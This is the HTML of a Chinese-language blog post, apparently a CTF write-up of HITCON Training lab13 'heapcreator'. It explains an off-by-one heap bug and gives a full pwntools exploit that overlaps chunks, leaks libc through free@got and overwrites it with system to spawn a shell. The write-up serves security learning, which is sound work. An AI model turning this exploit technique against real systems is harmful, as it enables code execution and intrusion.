@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>HITCON Trainging lab13 | winterze&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="chunk-extend学习，一个友好的题目，下载地址 0x00 程序分析基本信息 123456[*] &amp;apos;/home/ububtu/ctf/pwn/heapcreator&amp;apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON Trainging lab13">
+<meta property="og:url" content="http://yoursite.com/2020/04/16/HITCON-Trainging-lab13/index.html">
+<meta property="og:site_name" content="winterze&#39;s Blog">
+<meta property="og:description" content="chunk-extend学习，一个友好的题目，下载地址 0x00 程序分析基本信息 123456[*] &amp;apos;/home/ububtu/ctf/pwn/heapcreator&amp;apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabl">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="c:/Users/dell/AppData/Roaming/Typora/typora-user-images/1586611734293.png">
+<meta property="og:image" content="c:/Users/dell/AppData/Roaming/Typora/typora-user-images/1586612923039.png">
+<meta property="og:image" content="c:/Users/dell/AppData/Roaming/Typora/typora-user-images/1586613176346.png">
+<meta property="og:updated_time" content="2020-04-16T07:28:47.398Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON Trainging lab13">
+<meta name="twitter:description" content="chunk-extend学习，一个友好的题目，下载地址 0x00 程序分析基本信息 123456[*] &amp;apos;/home/ububtu/ctf/pwn/heapcreator&amp;apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabl">
+<meta name="twitter:image" content="c:/Users/dell/AppData/Roaming/Typora/typora-user-images/1586611734293.png">
+  
+    <link rel="alternate" href="/atom.xml" title="winterze&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">winterze&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-HITCON-Trainging-lab13" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/16/HITCON-Trainging-lab13/" class="article-date">
+  <time datetime="2020-04-16T07:27:36.000Z" itemprop="datePublished">2020-04-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HITCON Trainging lab13
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>chunk-extend学习，一个友好的题目，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">下载地址</a></p>
+<h3 id="0x00-程序分析"><a href="#0x00-程序分析" class="headerlink" title="0x00 程序分析"></a>0x00 程序分析</h3><p>基本信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>64位elf，开启了Canary和NX保护</p>
+<p>分析main函数</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586611734293.png" alt="1586611734293"></p>
+<p>大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针</p>
+<ol>
+<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
+<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 <a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">off-by-one</a>的漏洞</strong>。</li>
+<li>展示堆，输出指定索引堆的大小以及内容。</li>
+<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
+</ol>
+<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>函数edit_heap()</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586612923039.png" alt="1586612923039"></p>
+<p>heaparray[v1]中存放的是chunk的size,(*heaparray[v1]+1)其实就是heaparray[v1+1]中存放的是堆的指针。</p>
+<p>分析create_heap()</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586613176346.png" alt="1586613176346"></p>
+<p>heaparray就在堆上,可以直接改heaparray上的指针。</p>
+<p>基本利用思路:</p>
+<ol>
+<li>利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
+<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
+</ol>
+<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">heap = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">"ddaa"</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">＃将堆<span class="number">1</span>的结构大小改写为<span class="number">0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">＃触发堆<span class="number">1</span>的结构到fastbin <span class="number">0x40</span></span><br><span class="line">＃将<span class="number">1</span>的内容堆到fastbin <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">＃新堆<span class="number">1</span>的结构将指向旧堆<span class="number">1</span>的内容，大小为<span class="number">0x20</span></span><br><span class="line">＃新堆<span class="number">1</span>的内容将指向旧堆<span class="number">1</span>的结构，大小为<span class="number">0x30</span></span><br><span class="line">＃也就是说我们可以覆盖新堆<span class="number">1</span>的结构</span><br><span class="line">＃在这里，我们将其堆内容指针覆盖为free @ got</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak freeaddr</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#用系统地址覆盖free @ got</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>最后，记录下一位师傅做到<a href="https://blog.csdn.net/qq_40934487/article/details/91465347" target="_blank" rel="noopener">一道堆题的博客</a></p>
+<p>​     </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/16/HITCON-Trainging-lab13/" data-id="ck92g3mqn0001bwty1d6ly9ac" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/04/16/攻防世界-string/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">攻防世界,string</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/16/HITCON-Trainging-lab13/">HITCON Trainging lab13</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/16/攻防世界-string/">攻防世界,string</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/16/攻防世界-pwn200/">攻防世界,pwn200</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/16/攻防世界-level3/">攻防世界,level3</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/16/攻防世界-int-overflow/">攻防世界,int_overflow</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Ben<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
